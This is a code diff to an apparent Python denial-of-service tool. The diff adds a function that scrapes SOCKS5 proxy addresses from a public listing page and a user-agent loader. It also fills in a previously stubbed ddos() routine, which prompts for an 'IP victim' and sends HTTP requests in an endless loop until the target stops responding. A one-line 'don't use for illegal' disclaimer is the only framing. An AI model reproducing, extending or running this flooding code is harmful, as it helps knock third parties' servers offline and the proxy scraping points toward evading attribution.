@@ -1,3 +1,4 @@
+import re
 import sys
 import random
 import time
@@ -5,6 +6,7 @@ import os
 import socket
 from colorama import Fore
 import errno
+import requests
 
 title = Fore.CYAN + """
 
@@ -22,6 +24,14 @@ ___________.__           ________          __   _______          __         ___
                     """
 
 #attack_pack = 0
+
+def get_user_agents(filename: str):
+    user_agents = []
+    with open(filename, 'r') as f:
+        content = f.readlines()
+        for user_agent in content:
+            user_agents.append(str(user_agent.strip()))
+    return user_agents
 
 def dos():
     os.system("clear")
@@ -74,9 +84,43 @@ def banner():
     print(title)
     delay_print("Don't use for illegal porpouse\n")
 
+def get_proxies():
+    URL = "http://www.live-socks.net/2018/11/27-11-18-socks-5-servers_57.html?m=1"
+
+    req = requests.get(URL, timeout=10)
+    
+    content = req.text
+    proxies = re.findall(r"(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", content)
+    
+    return proxies
+
 def ddos():
     os.system("clear")
-    delay_print(Fore.RED + "Coming Soon")
+
+    host = str(input("IP victim: "))
+    pack_sent = 0
+
+    try:
+
+        try:
+
+            while True:
+                print(title)
+                
+                req = requests.get(host)
+                pack_sent += 1
+                print(f"Sent {pack_sent} Packets", end="\r")
+
+        except:
+            print("Server Down!")
+            time.sleep(1)
+            sys.exit()
+
+
+    except KeyboardInterrupt:
+        print("Stopping the attack")
+        delay_print("Byeee")
+        sys.exit()
 
 
 def main():
